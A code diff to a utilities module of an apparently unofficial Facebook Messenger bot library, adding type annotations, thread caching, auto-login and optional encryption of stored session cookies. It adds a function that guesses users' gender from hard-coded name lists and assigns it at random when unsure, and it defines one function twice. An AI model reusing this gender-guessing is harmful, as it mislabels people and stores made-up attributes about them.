     var ret = "";
     while (data !== "0") {
@@ -175,6 +227,10 @@ var j = {
     h = new RegExp(l.join("|"), "g");
 })();
 
+/**
+ * @param {string | number | boolean} str
+ */
+
 function presenceEncode(str) {
     return encodeURIComponent(str)
         .replace(/([_A-Z])|%../g, function(m, n) {
@@ -187,14 +243,22 @@ function presenceEncode(str) {
 }
 
 // eslint-disable-next-line no-unused-vars
+/**
+ * @param {string} str
+ */
+
 function presenceDecode(str) {
     return decodeURIComponent(
-        str.replace(/[_A-Z]/g, function(m) {
+        str.replace(/[_A-Z]/g, function(/** @type {string | number} */m) {
             return j[m];
         })
     );
 }
 
+/**
+ * @param {string} userID
+ */
+
 function generatePresence(userID) {
     var time = Date.now();
     return (
@@ -239,20 +303,30 @@ function generateAccessiblityCookie() {
 
 function getGUID() {
     /** @type {number} */
+
     var sectionLength = Date.now();
     /** @type {string} */
+
     var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
         /** @type {number} */
+
         var r = Math.floor((sectionLength + Math.random() * 16) % 16);
         /** @type {number} */
+
         sectionLength = Math.floor(sectionLength / 16);
         /** @type {string} */
+
         var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
         return _guid;
     });
     return id;
 }
 
+/**
+ * @param {{ mercury: any; blob_attachment: any; attach_type: any; sticker_attachment: any; extensible_attachment: { story_attachment: { target: { __typename: string; }; }; }; metadata: { stickerID: { toString: () => any; }; packID: { toString: () => any; }; spriteURI: any; spriteURI2x: any; width: any; height: any; frameCount: any; frameRate: any; framesPerRow: any; framesPerCol: any; fbid: { toString: () => any; }; url: any; dimensions: { split: (arg0: string) => any[]; width: any; height: any; }; duration: any; }; url: any; name: any; fileName: any; thumbnail_url: any; preview_url: any; preview_width: any; preview_height: any; large_preview_url: any; large_preview_width: any; large_preview_height: any; share: { share_id: { toString: () => any; }; title: any; description: any; source: any; media: { image: any; image_size: { width: any; height: any; }; playable: any; duration: any; animated_image_size: any; }; subattachments: any; uri: any; target: any; style_list: any; }; }} attachment1
+ * @param {{ caption?: any; description?: any; id: any; is_malicious?: any; mime_type?: any; file_size?: any; filename?: any; image_data: any; href?: any; }} [attachment2]
+ */
+
 function _formatAttachment(attachment1, attachment2) {
     // TODO: THIS IS REALLY BAD
     // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
@@ -260,6 +334,7 @@ function _formatAttachment(attachment1, attachment2) {
     // data that you'd want so we merge them for convenience.
     // Instead of having a bunch of if statements guarding every access to image_data,
     // we set it to empty object and use the fact that it'll return undefined.
+
     attachment2 = attachment2 || { id: "", image_data: {} };
     attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
     var blob = attachment1.blob_attachment;
@@ -531,6 +606,7 @@ function _formatAttachment(attachment1, attachment2) {
                 longitude = Number.parseFloat(address[1]);
             } catch (err) {
                 /* empty */
+
             }
 
             var imageUrl;
@@ -585,7 +661,7 @@ function _formatAttachment(attachment1, attachment2) {
                 playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,
 
                 subattachments: blob.story_attachment.subattachments,
-                properties: blob.story_attachment.properties.reduce(function(obj, cur) {
+                properties: blob.story_attachment.properties.reduce(function(/** @type {{ [x: string]: any; }} */obj, /** @type {{ key: string | number; value: { text: any; }; }} */cur) {
                     obj[cur.key] = cur.value.text;
                     return obj;
                 }, {}),
@@ -621,10 +697,17 @@ function _formatAttachment(attachment1, attachment2) {
     }
 }
 
+/**
+ * @param {any[]} attachments
+ * @param {{ [x: string]: string | number; }} attachmentIds
+ * @param {{ [x: string]: any; }} attachmentMap
+ * @param {any} shareMap
+ */
+
 function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
     attachmentMap = shareMap || attachmentMap;
     return attachments ?
-        attachments.map(function(val, i) {
+        attachments.map(function(/** @type {any} */val, /** @type {string | number} */i) {
             if (!attachmentMap ||
                 !attachmentIds ||
                 !attachmentMap[attachmentIds[i]]
@@ -635,15 +718,19 @@ function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
         }) : [];
 }
 
+/**
+ * @param {{ delta: { messageMetadata: any; data: { prng: string; }; body: string; attachments: any; participants: any; }; }} m
+ */
+
 function formatDeltaMessage(m) {
     var md = m.delta.messageMetadata;
     var mdata =
         m.delta.data === undefined ? [] :
         m.delta.data.prng === undefined ? [] :
         JSON.parse(m.delta.data.prng);
-    var m_id = mdata.map(u => u.i);
-    var m_offset = mdata.map(u => u.o);
-    var m_length = mdata.map(u => u.l);
+    var m_id = mdata.map((/** @type {{ i: any; }} */u) => u.i);
+    var m_offset = mdata.map((/** @type {{ o: any; }} */u) => u.o);
+    var m_length = mdata.map((/** @type {{ l: any; }} */u) => u.l);
     var mentions = {};
     var body = m.delta.body || "";
     var args = body == "" ? [] : body.trim().split(/\s+/);
@@ -656,7 +743,7 @@ function formatDeltaMessage(m) {
         messageID: md.messageId,
         args: args,
         body: body,
-        attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
+        attachments: (m.delta.attachments || []).map((/** @type {any} */v) => _formatAttachment(v)),
         mentions: mentions,
         timestamp: md.timestamp,
         isGroup: !!md.threadKey.threadFbId,
@@ -664,11 +751,19 @@ function formatDeltaMessage(m) {
     };
 }
 
+/**
+ * @param {string} id
+ */
+
 function formatID(id) {
     if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
     else return id;
 }
 
+/**
+ * @param {{ message: any; type: string; realtime_viewer_fbid: { toString: () => any; }; }} m
+ */
+
 function formatMessage(m) {
     var originalMessage = m.message ? m.message : m;
     var obj = {
@@ -677,7 +772,7 @@ function formatMessage(m) {
         senderID: formatID(originalMessage.sender_fbid.toString()),
         participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
         participantIDs: originalMessage.group_thread_info ?
-            originalMessage.group_thread_info.participant_ids.map(function(v) {
+            originalMessage.group_thread_info.participant_ids.map(function(/** @type {{ toString: () => any; }} */v) {
                 return formatID(v.toString());
             }) : [formatID(originalMessage.sender_fbid)],
         body: originalMessage.body || "",
@@ -697,7 +792,7 @@ function formatMessage(m) {
         timestampDatetime: originalMessage.timestamp_datetime,
         tags: originalMessage.tags,
         reactions: originalMessage.reactions ? originalMessage.reactions : [],
-        isUnread: originalMessage.is_unread
+        isUnread: originalMessage.is_unread 
     };
 
     if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
@@ -706,6 +801,10 @@ function formatMessage(m) {
     return obj;
 }
 
+/**
+ * @param {{ message: any; }} m
+ */
+
 function formatEvent(m) {
     var originalMessage = m.message ? m.message : m;
     var logMessageType = originalMessage.log_message_type;
@@ -723,6 +822,10 @@ function formatEvent(m) {
     });
 }
 
+/**
+ * @param {{ action_type: any; }} m
+ */
+
 function formatHistoryMessage(m) {
     switch (m.action_type) {
         case "ma-type:log-message":
@@ -733,8 +836,16 @@ function formatHistoryMessage(m) {
 }
 
 // Get a more readable message type for AdminTextMessages
+/**
+ * @param {{ type: any; }} m
+ */
+
 function getAdminTextMessageType(m) {
     switch (m.type) {
+        case "joinable_group_link_mode_change":
+            return "log:link-status"
+        case "magic_words":
+            return "log:magic-words";
         case "change_thread_theme":
             return "log:thread-color";
         case "change_thread_icon":
@@ -753,47 +864,187 @@ function getAdminTextMessageType(m) {
     }
 }
 
+/**
+ * @param {string} name
+ */
+
+function getGenderByPhysicalMethod(name) {
+    var GirlName = ["PRIYANSHI", "VANSHI", "TANIYA", "KAVYA", "AASHIKA", "AKSHITA", "ANSHIKA", "ANUSHKA", "ANKITA", "NEHA", "PARI", "PRIYA", "PRITI", "SANIA", "SONA", "SONIA", "MARRIYAM", "MAMTA", "ANU", "LOVELY", "VISHAKA", "DIYA", "DEEPIKA", "KIRAN", "POONAM", "SANA", "NAUGHTY", "ZARA", "AARTI", "QUEEN", "ANEE", "SAFIYA", "MAHI", "JOYA", "ALIKA", "ZOYA", "JASMINE", "BABY", "ZAIFA", "RANI", "BACHI", "SHALU", "LY", "HÃ’A", "OANH", "HÆ¯Æ NG", "Háº°NG", "QUá»²NH", "Háº NH", "NHIÃŠN", "NHáº N"];
+
+    var BoyName = ["PRIYANSHU", "PRIYANSH", "PRINCE", "AAKASH", "CHINMAY", "MANISH", "AWAIS", "PINTU", "ABHISHEK", "KUSHAL", "VIKAS", "SHIVANSH", "ARYAN", "ARUN", "AADI", "PANDA", "AJAY", "USMAN", "TERA", "FAISAL", "KHAN", "RAJPUT", "AAKASH", "AHMAD", "RAMESH", "THá»ŠNH", "TÃ’A", "TRIáº¾T", "TRUNG", "TRÆ¯á»œNG", "TUáº¤N", "NHÃ‚N", "VÅ¨", "VINH", "PHONG", "PHÃšC", "QUÃ‚N", "QUANG", "SÆ N", "TÃ€I", "THáº®NG", "ÄÄ‚NG", "VÄ‚N", "VÄ¨", "QUANG", "YASH"];
+
+    var OtherName = ["ANH", "THANH", "TÃ‚M", "DÆ¯Æ NG", "AN", "LÃ‚M", "MIÃŠN", "TÃš", "LÃ‚M", "Báº°NG", "KHÃNH", "NHáº¬T", "Vá»¸", ".",",","/","%", "&","*","-","+"];
+
+    try {
+        var NameArray = name.split(" ");
+            name = NameArray[NameArray.length - 1];
+        var Name;
+            if (name == " " || name == null) return "UNKNOWN";
+            switch (GirlName.includes(name.toUpperCase())) {
+                case true: {
+                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
+                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp ðŸŒš
+                }
+            break;
+                case false: {
+                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
+                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp ðŸŒš
+                }
+            break;
+        } 
+    }
+    catch (e) {
+        return "UNKNOWN"
+    }
+    return Name || "UNKNOWN";
+}
+
+/**
+ * @param {{ [x: string]: { [x: string]: { [x: string]: any; }; }; class: any; untypedData: any; name: any; addedParticipants: any; leftParticipantFbId: any; messageMetadata: { threadKey: { threadFbId: any; otherUserFbId: any; }; adminText: any; actorFbId: any; }; participants: any; }} m
+ */
+
 function formatDeltaEvent(m) {
+    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
     var logMessageType;
     var logMessageData;
 
-    // log:thread-color => {theme_color}
-    // log:user-nickname => {participant_id, nickname}
-    // log:thread-icon => {thread_icon}
-    // log:thread-name => {name}
-    // log:subscribe => {addedParticipants - [Array]}
-    // log:unsubscribe => {leftParticipantFbId}
-
-    switch (m.class) {
-        case "AdminTextMessage":
-            logMessageType = getAdminTextMessageType(m);
+switch (m.class) {
+    case "AdminTextMessage":
+        logMessageType = getAdminTextMessageType(m);
             logMessageData = m.untypedData;
-            break;
-        case "ThreadName":
-            logMessageType = "log:thread-name";
+        break;
+    case "ThreadName":
+        logMessageType = "log:thread-name";
             logMessageData = { name: m.name };
-            break;
-        case "ParticipantsAddedToGroupThread":
-            logMessageType = "log:subscribe";
+        break;
+    case "ParticipantsAddedToGroupThread":
+        logMessageType = "log:subscribe";
             logMessageData = { addedParticipants: m.addedParticipants };
-            break;
-        case "ParticipantLeftGroupThread":
-            logMessageType = "log:unsubscribe";
-            logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
-            break;
+        break;
+    case "ParticipantLeftGroupThread":
+        logMessageType = "log:unsubscribe";
+        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
+    break;
+}
+
+if (process.env.HalzionVersion == 1973) { 
+    switch (hasData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()))) {
+        case true: {
+            switch (logMessageType) {
+                case "log:thread-color": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    x.emoji = (logMessageData.theme_emoji || x.emoji);
+                    x.color = (logMessageData['theme_color'] || x.color);
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:thread-icon": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    x.emoji = (logMessageData['thread_icon'] || x.emoji);
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:user-nickname": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    x.nicknames[logMessageData.participant_id] = (logMessageData.nickname.length == 0 ? x.userInfo.find(i => i.id == String(logMessageData.participant_id)).name : logMessageData.nickname);
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:thread-admins": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    switch (logMessageData.ADMIN_EVENT) {
+                        case "add_admin": {
+                            x.adminIDs.push({ id: logMessageData.TARGET_ID });
+                        }
+                            break;
+                        case "remove_admin": {
+                            x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.TARGET_ID);
+                        }
+                        break;
+                    }
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:thread-approval-mode": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    if (x.approvalMode == true) { 
+                        x.approvalMode = false;
+                    }
+                    else {
+                        x.approvalMode = true;
+                    }
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:thread-name": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    x.threadName = (logMessageData.name || formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:subscribe": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    for (let o of logMessageData.addedParticipants) {
+                        if (x.userInfo.some(i => i.id == o.userFbId)) continue; 
+                        else {
+                            x.userInfo.push({
+                                id: o.userFbId,
+                                name: o.fullName,
+                                gender: getGenderByPhysicalMethod(o.fullName)
+                            })
+                            x.participantIDs.push(o.userFbId);
+                        }
+                    }
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);
+                }
+                    break;
+                case "log:unsubscribe": {
+                    let x = getData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()));
+                    x.participantIDs = x.participantIDs.filter(item => item != logMessageData.leftParticipantFbId);
+                    x.userInfo = x.userInfo.filter(item => item.id != logMessageData.leftParticipantFbId);
+                        if (x.adminIDs.some(i => i.id == logMessageData.leftParticipantFbId)) {
+                            x.adminIDs = x.adminIDs.filter(item => item.id != logMessageData.leftParticipantFbId);
+                        }
+                    updateData(formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),x);      
+                }
+                break;
+            }
+        }
     }
+}
 
-    return {
-        type: "event",
-        threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
-        logMessageType: logMessageType,
-        logMessageData: logMessageData,
-        logMessageBody: m.messageMetadata.adminText,
-        author: m.messageMetadata.actorFbId,
-        participantIDs: m.participants || []
+return {
+    type: "event",
+    threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
+    logMessageType: logMessageType,
+    logMessageData: logMessageData,
+    logMessageBody: m.messageMetadata.adminText,
+    author: m.messageMetadata.actorFbId,
+    participantIDs: m.participants || []
+    };  
+}
+
+/**
+ * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event
+ */
+
+function formatTyp(event) {
+return {
+        isTyping: !!event.st,
+        from: event.from.toString(),
+        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
+        // When receiving typ indication from mobile, `from_mobile` isn't set.
+        // If it is, we just use that value.
+        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
+        userID: (event.realtime_viewer_fbid || event.from).toString(),
+        type: "typ"
     };
 }
 
+/**
+ * @param {{ st: any; from: { toString: () => any; }; to: any; thread_fbid: any; hasOwnProperty: (arg0: string) => any; from_mobile: any; realtime_viewer_fbid: any; }} event
+ */
+
 function formatTyp(event) {
     return {
         isTyping: !!event.st,
@@ -807,6 +1058,10 @@ function formatTyp(event) {
     };
 }
 
+/**
+ * @param {{ threadKey: { otherUserFbId: any; threadFbId: any; }; actorFbId: any; actionTimestampMs: any; }} delta
+ */
+
 function formatDeltaReadReceipt(delta) {
     // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
     // In a group chat actorFbId is used for the reader and threadFbId for the thread.
@@ -818,6 +1073,10 @@ function formatDeltaReadReceipt(delta) {
     };
 }
 
+/**
+ * @param {{ reader: { toString: () => any; }; time: any; thread_fbid: any; }} event
+ */
+
 function formatReadReceipt(event) {
     return {
         reader: event.reader.toString(),
@@ -827,6 +1086,10 @@ function formatReadReceipt(event) {
     };
 }
 
+/**
+ * @param {{ chat_ids: any[]; thread_fbids: any[]; timestamp: any; }} event
+ */
+
 function formatRead(event) {
     return {
         threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
@@ -835,6 +1098,12 @@ function formatRead(event) {
     };
 }
 
+/**
+ * @param {string} str
+ * @param {string | any[]} startToken
+ * @param {string} endToken
+ */
+
 function getFrom(str, startToken, endToken) {
     var start = str.indexOf(startToken) + startToken.length;
     if (start < startToken.length) return "";
@@ -845,8 +1114,13 @@ function getFrom(str, startToken, endToken) {
     return lastHalf.substring(0, end);
 }
 
+/**
+ * @param {string} html
+ */
+
 function makeParsable(html) {
-    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");
+    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/
+, "");
 
     // (What the fuck FB, why windows style newlines?)
     // So sometimes FB will send us base multiple objects in the same response.
@@ -863,19 +1137,30 @@ function makeParsable(html) {
     return "[" + maybeMultipleObjects.join("},{") + "]";
 }
 
+/**
+ * @param {any} form
+ */
+
 function arrToForm(form) {
     return arrayToObject(form,
-        function(v) {
+        function(/** @type {{ name: any; }} */v) {
             return v.name;
         },
-        function(v) {
+        function(/** @type {{ val: any; }} */v) {
             return v.val;
         }
     );
 }
 
+/**
+ * @param {any[]} arr
+ * @param {{ (v: any): any; (arg0: any): string | number; }} getKey
+ * @param {{ (v: any): any; (arg0: any): any; }} getValue
+ */
+
 function arrayToObject(arr, getKey, getValue) {
-    return arr.reduce(function(acc, val) {
+    return arr.reduce(function(/** @type {{ [x: string]: any; }} */
+ acc, /** @type {any} */val) {
         acc[getKey(val)] = getValue(val);
         return acc;
     }, {});
@@ -890,6 +1175,12 @@ function generateTimestampRelative() {
     return d.getHours() + ":" + padZeros(d.getMinutes());
 }
 
+/**
+ * @param {any} html
+ * @param {any} userID
+ * @param {{ fb_dtsg: any; ttstamp: any; globalOptions: any; }} ctx
+ */
+
 function makeDefaults(html, userID, ctx) {
     var reqCounter = 1;
     var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');
@@ -913,6 +1204,10 @@ function makeDefaults(html, userID, ctx) {
     for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
     var revision = getFrom(html, 'revision":', ",");
 
+    /**
+     * @param {{ [x: string]: any; hasOwnProperty: (arg0: string) => any; }} obj
+     */
+
     function mergeWithDefaults(obj) {
         // @TODO This is missing a key called __dyn.
         // After some investigation it seems like __dyn is some sort of set that FB
@@ -953,14 +1248,36 @@ function makeDefaults(html, userID, ctx) {
         return newObj;
     }
 
+    /**
+     * @param {any} url
+     * @param {any} jar
+     * @param {any} form
+     * @param {any} ctxx
+     */
+
     function postWithDefaults(url, jar, form, ctxx) {
         return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
     }
 
+    /**
+     * @param {any} url
+     * @param {any} jar
+     * @param {any} qs
+     * @param {any} ctxx
+     */
+
     function getWithDefaults(url, jar, qs, ctxx) {
         return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
     }
 
+    /**
+     * @param {any} url
+     * @param {any} jar
+     * @param {any} form
+     * @param {any} qs
+     * @param {any} ctxx
+     */
+
     function postFormDataWithDefault(url, jar, form, qs, ctxx) {
         return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
     }
@@ -972,9 +1289,15 @@ function makeDefaults(html, userID, ctx) {
     };
 }
 
+/**
+ * @param {{ jar: { setCookie: (arg0: string, arg1: string) => void; }; fb_dtsg: string; ttstamp: string; }} ctx
+ * @param {{ postFormData: (arg0: string, arg1: any, arg2: any, arg3: {}) => any; post: (arg0: string, arg1: any, arg2: any) => any; get: (arg0: any, arg1: any) => Promise<any>; }} defaultFuncs
+ * @param {string | number} [retryCount]
+ */
+
 function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
     if (retryCount == undefined) retryCount = 0;
-    return function(data) {
+    return function(/** @type {{ body: string; statusCode: string | number; request: { uri: { protocol: string; hostname: string; pathname: string; }; headers: { [x: string]: string; }; formData: any; method: string; }; }} */data) {
         return bluebird.try(function() {
             log.verbose("parseAndCheckLogin", data.body);
             if (data.statusCode >= 500 && data.statusCode < 600) {
@@ -1037,19 +1360,37 @@ function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
                 }
             }
 
-            if (res.error === 1357001) throw { error: "ChÆ°a ÄÄƒng Nháº­p ÄÆ°á»£c - Appstate ÄÃ£ Bá»‹ Lá»—i" };
-            return res;
+            if (res.error === 1357001) {
+                switch (globalThis.Fca.Require.Priyansh.AutoLogin) {
+                    case true: {
+                        globalThis.Fca.Require.logger.Warning(globalThis.Fca.Require.Language.Index.AutoLogin, function() {
+                            return globalThis.Fca.AutoLogin();
+                        });
+                        break;
+                    }
+                    case false: {
+                        throw { error: globalThis.Fca.Require.Language.Index.ErrAppState };
+                        
+                    }
+                }
+            }
+            else return res;
         });
     };
 }
 
+/**
+ * @param {{ setCookie: (arg0: any, arg1: string) => void; }} jar
+ */
+
 function saveCookies(jar) {
-    return function(res) {
+    return function(/** @type {{ headers: { [x: string]: any[]; }; }} */res) {
         var cookies = res.headers["set-cookie"] || [];
-        cookies.forEach(function(c) {
-            if (c.indexOf(".facebook.com") > -1) jar.setCookie(c, "https://www.facebook.com");
-            var c2 = c.replace(/domain=\.facebook\.com/, "domain=.messenger.com");
-            jar.setCookie(c2, "https://www.messenger.com");
+        cookies.forEach(function(/** @type {string} */c) {
+            if (c.indexOf(".facebook.com") > -1) { // yo wtf is this?
+                jar.setCookie(c, "https://www.facebook.com");
+                jar.setCookie(c.replace(/domain=\.facebook\.com/, "domain=.messenger.com"), "https://www.messenger.com");
+            }
         });
         return res;
     };
@@ -1071,6 +1412,10 @@ var NUM_TO_MONTH = [
 ];
 var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
 
+/**
+ * @param {{ getUTCDate: () => any; getUTCHours: () => any; getUTCMinutes: () => any; getUTCSeconds: () => any; getUTCDay: () => string | number; getUTCMonth: () => string | number; getUTCFullYear: () => string; }} date
+ */
+
 function formatDate(date) {
     var d = date.getUTCDate();
     d = d >= 10 ? d : "0" + d;
@@ -1083,10 +1428,19 @@ function formatDate(date) {
     return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
 }
 
+/**
+ * @param {string[]} arr
+ * @param {string} url
+ */
+
 function formatCookie(arr, url) {
     return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
 }
 
+/**
+ * @param {{ thread_fbid: { toString: () => any; }; participants: any[]; name: any; custom_nickname: any; snippet: any; snippet_attachments: any; snippet_sender: any; unread_count: any; message_count: any; image_src: any; timestamp: any; mute_until: any; is_canonical_user: any; is_canonical: any; is_subscribed: any; folder: any; is_archived: any; recipients_loadable: any; has_email_participant: any; read_only: any; can_reply: any; cannot_reply_reason: any; last_message_timestamp: any; last_read_timestamp: any; last_message_type: any; custom_like_icon: any; custom_color: any; admin_ids: any; thread_type: any; }} data
+ */
+
 function formatThread(data) {
     return {
         threadID: formatID(data.thread_fbid.toString()),
@@ -1101,7 +1455,6 @@ function formatThread(data) {
         messageCount: data.message_count,
         imageSrc: data.image_src,
         timestamp: data.timestamp,
-        serverTimestamp: data.server_timestamp, // what is this?
         muteUntil: data.mute_until,
         isCanonicalUser: data.is_canonical_user,
         isCanonical: data.is_canonical,
@@ -1123,10 +1476,19 @@ function formatThread(data) {
     };
 }
 
+/**
+ * @param {any} obj
+ */
+
 function getType(obj) {
     return Object.prototype.toString.call(obj).slice(8, -1);
 }
 
+/**
+ * @param {{ lat: number; p: any; }} presence
+ * @param {any} userID
+ */
+
 function formatProxyPresence(presence, userID) {
     if (presence.lat === undefined || presence.p === undefined) return null;
     return {
@@ -1137,6 +1499,11 @@ function formatProxyPresence(presence, userID) {
     };
 }
 
+/**
+ * @param {{ la: number; a: any; }} presence
+ * @param {any} userID
+ */
+
 function formatPresence(presence, userID) {
     return {
         type: "presence",
@@ -1146,10 +1513,19 @@ function formatPresence(presence, userID) {
     };
 }
 
+/**
+ * @param {any} payload
+ */
+
 function decodeClientPayload(payload) {
     /*
     Special function which Client using to "encode" clients JSON payload
     */
+
+    /**
+     * @param {string | any[]} array
+     */
+
     function Utf8ArrayToStr(array) {
         var out, i, len, c;
         var char2, char3;
@@ -1175,7 +1551,7 @@ function decodeClientPayload(payload) {
                     out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                     break;
                 case 14:
-                    char2 = array[i++];
+                    char2 = array[i++]; 
                     char3 = array[i++];
                     out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                     break;
@@ -1186,12 +1562,49 @@ function decodeClientPayload(payload) {
     return JSON.parse(Utf8ArrayToStr(payload));
 }
 
-function getAppState(jar) {
-    return jar
-        .getCookies("https://www.facebook.com")
-        .concat(jar.getCookies("https://facebook.com"))
-        .concat(jar.getCookies("https://www.messenger.com"));
+/**
+ * @param {{ getCookies: (arg0: string) => string | any[]; }} jar
+ */
+
+function getAppState(jar, Encode) {
+    var prettyMilliseconds = require('pretty-ms')
+    var getText = globalThis.Fca.getText;
+    var Security = require('./Extra/Security/Index');
+    var appstate = jar.getCookies("https://www.facebook.com").concat(jar.getCookies("https://facebook.com")).concat(jar.getCookies("https://www.messenger.com"))
+    var logger = require('./logger'),languageFile = require('./Language/index.json');
+    var Language = languageFile.find(i => i.Language == globalThis.Fca.Require.Priyansh.Language).Folder.Index;
+    var data;
+        switch (require(process.cwd() + "/PriyanshFca.json").EncryptFeature) {
+            case true: {
+                if (Encode == undefined) Encode = true;
+                if (process.env['FBKEY'] != undefined && Encode) {
+                    if(!globalThis.Fca.Setting.get('getAppState')) {
+                        logger.Normal(Language.EncryptSuccess);
+                        data = Security(JSON.stringify(appstate),process.env['FBKEY'],"Encrypt");
+                        globalThis.Fca.Setting.set('AppState', data);
+                    }
+                    else {
+                        data = globalThis.Fca.Setting.get('AppState');
+                    }
+                }
+                else return appstate;
+            }
+                break;
+            case false: {
+                data = appstate;
+            }
+                break;
+            default: {
+                logger.Normal(getText(Language.IsNotABoolean,require(process.cwd() + "/PriyanshFca.json").EncryptFeature));
+                data = appstate;
+            } 
+        }
+            if(!globalThis.Fca.Setting.get('getAppState')) {
+                logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - globalThis.Fca.startTime)}`),function() { globalThis.Fca.Setting.set('getAppState',true) });
+            }
+    return data;
 }
+
 module.exports = {
     isReadableStream:isReadableStream,
     get:get,
@@ -1208,6 +1621,7 @@ module.exports = {
     generateTimestampRelative:generateTimestampRelative,
     makeDefaults:makeDefaults,
     parseAndCheckLogin:parseAndCheckLogin,
+    getGender: getGenderByPhysicalMethod,
     saveCookies,
     getType,
     _formatAttachment,
@@ -1231,4 +1645,4 @@ module.exports = {
     getAppState,
     getAdminTextMessageType,
     setProxy
-};
\ No newline at end of file
+};
